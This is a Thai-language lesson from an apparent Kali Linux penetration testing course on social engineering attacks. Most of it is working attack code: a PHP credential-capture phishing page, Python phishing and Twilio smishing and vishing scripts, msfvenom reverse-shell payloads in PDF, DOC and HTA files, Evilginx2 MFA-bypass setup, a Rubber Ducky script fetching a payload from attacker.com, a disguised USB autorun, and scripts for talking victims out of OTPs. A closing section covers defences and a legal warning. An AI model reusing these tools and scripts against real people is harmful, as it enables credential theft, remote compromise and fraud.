# Part 14: Social Engineering Toolkit (SET)
## เทคนิคการโจมตีด้วย Social Engineering

---

## สารบัญ
1. [Social Engineering คืออะไร](#intro)
2. [Social Engineering Toolkit (SET)](#set)
3. [Phishing Attacks](#phishing)
4. [Spear Phishing Email](#spear-phishing)
5. [SMS Phishing (Smishing)](#smishing)
6. [Vishing - Voice Phishing](#vishing)
7. [USB Drop Attacks](#usb)
8. [Pretexting & Scenarios](#pretexting)
9. [Defense และการป้องกัน](#defense)
10. [แบบฝึกหัด](#exercises)

---

## 1. Social Engineering คืออะไร {#intro}

**Social Engineering** คือการหลอลวงเพื่อให้บุคคลทำการ เปิดเผยข้อมูล หรือทำลายสิ่งที่ใช้แทน technical exploits

### ทำไม Social Engineering ถึงสำคัญ?
- 95% of breaches เกิดจาก human error
- ข้ามผ่าน technical security (ไฟร์วอล, AV) ได้ง่าย
- ใช้ความไว้วางใจของมนุษย์

### หลักการ Social Engineering
```
1. Pretexting    - สร้างเหตุผลเท็จที่เชื่อถือ
2. Phishing      - ส่งอีเมลหลอก
3. Vishing       - หลอกผ่านเสียง
4. Smishing      - SMS หลอก
5. Tailgating    - บุกรุกตาม
6. Baiting       - สอดUSB/CD เพื่อให้เหยื่อ
7. Quid Pro Quo  - แลกเปลี่ยนข้อมูล
```

### OSINT ก่อน Social Engineering

```bash
# เก็บข้อมูลเป้าหมาย
theHarvester -d target.com -b linkedin  # หาพนักงาน
sherlock john.doe                       # หา social media
linkedin2username -c "Company Name"     # หา usernames

# ข้อมูลที่ต้องการ:
# - ชื่อ-นามสกุล
# - ตำแหน่งงาน
# - Email format
# - ข้อมูล manager/boss
# - เบอร์โทร
# - โปรเจคที่กำลังทำ
```

---

## 2. Social Engineering Toolkit (SET) {#set}

```bash
# ติดตั้ง SET
apt update && apt install set -y
# หรือ
git clone https://github.com/trustedsec/social-engineer-toolkit setoolkit
cd setoolkit
pip3 install -r requirements.txt
python3 setup.py

# เริ่ม SET
setoolkit
# หรือ
sudo python3 setoolkit
```

### SET Menu Structure

```
 SET MENU:
 1) Social-Engineering Attacks
 2) Penetration Testing (Fast-Track)
 3) Third Party Modules
 4) Update the Social-Engineer Toolkit
 5) Update SET configuration
 6) Help, Credits, and Acknowledgments
 99) Exit the Social-Engineer Toolkit

 OPTION 1 Sub-menu:
 1) Spear-Phishing Attack Vectors
 2) Website Attack Vectors
 3) Infectious Media Generator
 4) Create a Payload and Listener
 5) Mass Mailer Attack
 6) Arduino-Based Attack Vector
 7) Wireless Access Point Attack Vector
 8) QRCode Generator Attack Vector
 9) Powershell Attack Vectors
 10) SMS Spoofing Attack Vector
```

### Credential Harvester ด้วย SET

```
# SET -> 1 (Social Engineering)
# -> 2 (Website Attack Vectors)
# -> 3 (Credential Harvester Attack Method)
# -> 2 (Site Cloner)
# Enter IP to listen: 192.168.1.100  (Kali IP)
# Enter URL to clone: https://login.example.com

# SET จะ:
# 1. Clone หน้าเว็บ
# 2. เปิด HTTP server
# 3. รอ credentials
# เมื่อ victim ใส่ username/password
# SET จะแสดง:
# [*] WE GOT A HIT! Printing the output:
# POSSIBLE USERNAME FIELD FOUND: username
# POSSIBLE PASSWORD FIELD FOUND: password
```

---

## 3. Phishing Attacks {#phishing}

### GoPhish - Phishing Framework

```bash
# Download GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish

# Web UI: https://127.0.0.1:3333
# Default: admin / gophish

# Components:
# 1. Sending Profile (SMTP settings)
# 2. Email Template (HTML email)
# 3. Landing Page (Fake website)
# 4. User Group (Targets)
# 5. Campaign (Put it together)

# การสร้าง Email Template
# From: IT Support <it@company.com>
# Subject: Urgent: Password Reset Required
# Body: Your password expires in 24 hours. Click here to reset.
```

### สร้าง Phishing Page

```bash
# Clone หน้า website ด้วย HTTrack
httrack https://login.target.com -O /var/www/html/phish

# Clone ด้วย wget
wget --mirror --page-requisites --convert-links https://login.target.com

# เพิ่ม credential capture ใน PHP
cat > /var/www/html/phish/capture.php << 'EOF'
<?php
$data = date('Y-m-d H:i:s') . '|' . $_SERVER['REMOTE_ADDR'] . '|';
$data .= $_POST['username'] . '|' . $_POST['password'] . "\n";
file_put_contents('credentials.txt', $data, FILE_APPEND);
header('Location: https://real-login.target.com?error=invalid_credentials');
EOF

# แก้ form action ใน HTML clone
sed -i 's/action=".*"/action="capture.php"/' index.html

# Start Apache
systemctl start apache2
```

### สร้าง Phishing Email

```bash
# Swaks - ส่ง test email
swaks --to target@example.com \
      --from "IT Support <it@company.com>" \
      --server mail.company.com \
      --auth-user myaccount \
      --auth-password mypassword \
      --header "Subject: Urgent: Action Required" \
      --body "Please verify your account at http://phish.example.com"

# การสร้าง HTML email template
python3 << 'EOF'
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_phish(target_email, smtp_server, smtp_user, smtp_pass):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = 'Urgent: Your account needs verification'
    msg['From'] = 'IT Support <it-support@company.com>'
    msg['To'] = target_email
    
    html = """
    <html><body>
    <p>Dear User,</p>
    <p>We detected unusual activity on your account. Please verify immediately:</p>
    <a href='http://phish-server.com/login'
       style='background:#0066cc;color:white;padding:10px 20px;text-decoration:none'>
       Verify Account
    </a>
    <p>IT Security Team</p>
    </body></html>
    """
    
    msg.attach(MIMEText(html, 'html'))
    
    with smtplib.SMTP_SSL(smtp_server, 465) as server:
        server.login(smtp_user, smtp_pass)
        server.sendmail(msg['From'], target_email, msg.as_string())
    print(f'[+] Sent to {target_email}')

send_phish('target@example.com', 'smtp.gmail.com', 'sender@gmail.com', 'password')
EOF
```

---

## 4. Spear Phishing Email {#spear-phishing}

### สร้าง Spear Phishing Payload

```bash
# SET Spear Phishing
# SET -> 1 -> 1 (Spear-Phishing)
# -> 1 (Perform a Mass Email Attack)

# สร้าง malicious PDF
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -f pdf > malicious.pdf

# สร้าง malicious Office document
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -f doc > invoice.doc

# สร้าง malicious HTA file
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -f hta-psh > update.hta

# เริ่มตัวรับ
msfconsole -q -x "
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
exploit -j
"
```

### Evilginx2 - Advanced Phishing (MFA Bypass)

```bash
# Evilginx2 - MITM phishing proxy
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

# Run
./evilginx2

# Config domain (ต้องมี domain จริง)
config domain phish.example.com
config ip 1.2.3.4  (your VPS IP)

# Setup phishlet
phishlets hostname office365 login.phish.example.com
phishlets enable office365

# Create lure
lures create office365
lures get-url 0

# เมื่อ victim login:
# Evilginx2 จะจับ: username, password, session cookie
# ใช้ cookie bypass MFA
```

---

## 5. SMS Phishing (Smishing) {#smishing}

```bash
# SMS Spoofing ด้วย Twilio
pip3 install twilio

python3 << 'EOF'
from twilio.rest import Client

account_sid = 'YOUR_ACCOUNT_SID'
auth_token = 'YOUR_AUTH_TOKEN'
client = Client(account_sid, auth_token)

message = client.messages.create(
    body='Your bank account was blocked. Verify immediately: http://bank-verify.example.com',
    from_='+1234567890',
    to='+66812345678'
)

print(f'Message sent: {message.sid}')
EOF

# SMS Phishing websites ต้องเป็น mobile-friendly
# ใช้ Bootstrap หรือ responsive design
```

---

## 6. Vishing - Voice Phishing {#vishing}

```bash
# Scenarios ทั่วไป:
# 1. IT Support: "เราต้องการ verify account ของคุณ"
# 2. Bank: "บัตรเครดิตถูก block กรุณา verify"
# 3. Government: "มีปัญหากับ tax ของคุณ"

# VoIP Spoofing ด้วย SpoofCard, SpoofTel
# Caller ID Spoofing ด้วย FreePBX

# Asterisk/FreePBX Setup
apt install asterisk -y

# Script สำหรับ automated vishing
python3 << 'EOF'
# ใช้ Twilio Programmable Voice
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

def create_vishing_call(to_number):
    account_sid = 'YOUR_SID'
    auth_token = 'YOUR_TOKEN'
    client = Client(account_sid, auth_token)
    
    # TwiML script
    response = VoiceResponse()
    gather = Gather(num_digits=1, action='/handle-input')
    gather.say(
        'This is IT security department. '
        'Your account has been compromised. '
        'Press 1 to speak with an agent.',
        voice='alice'
    )
    response.append(gather)
    
    call = client.calls.create(
        twiml=str(response),
        to=to_number,
        from_='+1234567890'
    )
    return call.sid
EOF
```

---

## 7. USB Drop Attacks {#usb}

### BadUSB / Rubber Ducky

```bash
# Rubber Ducky - HID Attack เขียน keystroke เหมือน keyboard
# ราคา ~$45 จาก hak5.org

# DuckyScript Example
# Payload: เปิด PowerShell + download malware
cat > payload.duck << 'EOF'
DELAY 500
GUI r
DELAY 200
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 500
STRING IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
ENTER
EOF

# Encode และ flash ไปยัง Rubber Ducky
java -jar encoder.jar -i payload.duck -o inject.bin

# เริ่ม listener
msfconsole -q -x "
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
exploit -j
"
```

### AutoRun Payload (USB)

```bash
# สร้าง malicious USB ด้วย msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f exe -o /media/usb/setup.exe

# สร้าง autorun.inf
cat > /media/usb/autorun.inf << 'EOF'
[AutoRun]
open=setup.exe
action=Install Latest Security Update
icon=setup.exe
EOF

# เพิ่มไฟล์ความน่าสนใจใน USB
# เช่น: "Secret Salary List.pdf.exe" (เปลี่ยน icon เป็น PDF)
```

---

## 8. Pretexting & Scenarios {#pretexting}

### ตัวอย่าง Pretext Scenarios

```
Scenario 1: IT Help Desk
- โทรหาพนักงาน: "ผมเป็น IT ต้องการตรวจสอบ account ของคุณ"
- ขอ username/password "เพื่อ verify"
- หรือขอให้ผู้ใช้เปิด TeamViewer

Scenario 2: HR Department
- Email: "ต้องการยืนยัน direct deposit account"
- PDF มี macro malicious

Scenario 3: IT Security
- "เราพบว่า account ของคุณถูกใช้งานผิดปกติ"
- "กรุณา login ที่ link นี้เพื่อ secure account"

Scenario 4: Vendor/Supplier
- "ผม John จาก Microsoft support"
- "License ของคุณหมดอายุ ต้องการ remote access เพื่อ renew"

Scenario 5: New Employee
- สร้างตัวเองเป็นพนักงานใหม่
- ขอข้อมูล network/systems โดยบอกว่าเพิ่งเข้าทำงาน
```

### Script สำหรับ Pretexting

```
Vishing Script Template:

"สวัสดีครับ ผมชื่อ [ชื่อ] จาก [แผนก/บริษัท]
ผมต้องการพูดคุยกับ [ชื่อเป้าหมาย] ครับ

[เมื่อเป้าหมายรับ]
สวัสดีครับ ผมชื่อ [ชื่อ] IT Security
เราพบกิจกรรมผิดปกติใน account ของคุณจากต่างประเทศ
เพื่อ secure account กรุณา verify ตัวตนครับ

ผมจะส่ง One-Time Password ทาง SMS
ช่วยบอกรหัสที่ได้รับให้ผมทีครับ"

[Note: นี่คือวิธีที่ attackers ใช้ bypass MFA!]
```

---

## 9. Defense และการป้องกัน {#defense}

### Technical Controls

```bash
# Email Security
# SPF Record - ป้องกัน email spoofing
dig target.com TXT | grep spf
# v=spf1 include:_spf.google.com ~all

# DMARC - รายงาน phishing
dig _dmarc.target.com TXT
# v=DMARC1; p=reject; rua=mailto:dmarc@target.com

# DKIM - ลงชื่อ email
dig default._domainkey.target.com TXT

# URL Filtering / Web Proxy
# Anti-phishing browser extensions
# HTTPS everywhere
```

### User Awareness Training

```
สิ่งที่ต้องสอนพนักงาน:
1. ไม่คลิก link ใน email โดยไม่ verify
2. ตรวจสอบ domain ก่อน login (บางครั้งต่างกันแค่ตัวเดียว)
3. IT จริงๆ จะไม่ขอ password
4. MFA ไม่ share OTP กับใคร
5. Suspicious email ให้ report ไม่ใช่ forward
6. USB ที่ไม่รู้จักอย่าเสียบ

ตรวจสอบ Phishing URL:
- paypa1.com vs paypal.com
- g00gle.com vs google.com
- login-bankofamerica-secure.com
```

### Phishing Simulation

```bash
# ทำ internal phishing simulation ด้วย GoPhish
# เพื่อวัด awareness ของพนักงาน

# Steps:
# 1. ได้รับอนุญาตจาก management
# 2. สร้าง realistic phishing email
# 3. ส่งไปยัง employee list
# 4. Track:
#    - Email opened
#    - Link clicked
#    - Credentials entered
# 5. Training สำหรับผู้ที่หลงเชื่อ

# Metrics ที่ดี:
# Click rate < 5%
# Credential submit rate < 1%
```

---

## 10. แบบฝึกหัด {#exercises}

### Lab 1: Credential Harvester

สร้าง phishing page สำหรับ lab:
1. ใช้ SET clone login page (localhost)
2. เปิด credential harvester
3. ทดสอบจาก browser
4. ดูผลลัพธ์

### Lab 2: GoPhish Campaign
1. ตั้งค่า GoPhish
2. สร้าง email template
3. สร้าง landing page
4. ส่งไปยัง test email
5. ดู tracking stats

### Lab 3: USB Payload
1. สร้าง reverse shell payload
2. ทดสอบบน VM
3. วิเคราะห์ behavior

---

## สรุป

| เทคนิค | Tool |
|-------|------|
| Credential Harvest | SET, GoPhish |
| Spear Phishing | msfvenom, SET |
| MFA Bypass | Evilginx2 |
| HID Attack | Rubber Ducky |
| Simulation | GoPhish |

**กฎหมาย**: Social Engineering โดยไม่ได้รับอนุญาตถือเป็นความผิดทางอาญา! ใช้เพื่อการทดสอบและ training เท่านั้น!

---
*Part 14/100+ | Kali Linux Penetration Testing Course*
